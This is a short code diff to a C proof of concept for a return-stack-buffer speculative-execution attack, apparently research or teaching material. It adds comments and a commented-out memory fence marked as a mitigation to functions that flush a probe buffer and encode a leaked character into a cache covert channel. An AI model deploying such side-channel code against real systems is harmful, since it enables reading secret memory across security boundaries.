@@ -17,6 +17,7 @@ int __attribute__ ((noinline)) call_leak(char s) {
   call_manipulate_stack();
   // architecturally, this is never executed
   // Encode data in covert channel
+  //_mm_mfence(); mitigates attack
   maccess(oracle_block + s * PAGESIZE);
   return 2;
 }
@@ -40,9 +41,13 @@ void confuse_compiler() {
 
 
 void rsb_atk(char info){
-    flush(oracle_block, PAGESIZE);
-    _mm_mfence();
-    call_start(info);
-    _mm_mfence();
+  // prepare and complete an rsb attack on a specific character
+
+  // reset sidechannel
+  flush(oracle_block, PAGESIZE);
+  _mm_mfence();
+  // start call chain with the requisite information
+  call_start(info);
+  _mm_mfence();
 }
 
